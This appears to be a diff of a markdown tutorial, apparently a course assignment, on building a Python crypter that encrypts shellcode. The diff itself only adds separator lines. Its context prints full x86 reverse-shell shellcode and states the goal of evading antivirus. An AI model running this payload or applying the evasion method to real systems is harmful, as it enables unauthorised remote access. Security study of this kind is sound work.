@@ -7,7 +7,7 @@
 - HMAC using SHA256 for authentication.
 - Initialization vectors are generated using os.urandom().
 - The password will be static, but in every non-test consideration it should never be placed inside the file, but received from the user
-
+------------------------------------------------------------------------------------------------
 ### Shellcode
 
 <p style="text-align: justify;">We'll use Crypter against shellcode from Assignment No. 2, which means reverse shell written using execve-stack technique. These operations are carried out in order to deceive or bypass anti-virus software or other security systems.</p>
@@ -114,7 +114,7 @@ root
 ```sh
 "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x31\xf6\x56\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc2\xb0\x66\xb3\x03\x56\xb9\x84\x05\x05\x06\x81\xe9\x05\x05\x05\x05\x51\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\xb0\x3f\x89\xd3\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\xb0\x0b\x31\xf6\x56\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xcd\x80"
 ```
-
+------------------------------------------------------------------------------------------------
 ### Encrypter
 
 <p style="text-align: justify;">Below is the Encrypter code in Python, which I tried to explain using comments in individual sections.</p>
@@ -207,6 +207,7 @@ tCJp16dKRFfkskbfy6kew8_fkNk4EHIfv1et8BNaxRE=
 ```
 <p style="text-align: justify;">Fantastic, it works as it should. Our shellcode in no way resembles the one we used for the encryption operation.</p>
 
+------------------------------------------------------------------------------------------------
 ### Decrypter
 
 <p style="text-align: justify;">Below is the Decrypter code, written in Python, which will perform exactly the opposite operations to restore the original shellcode in case a valid key.key file is provided. Otherwise, the program will return an error indicating an invalid key.</p>
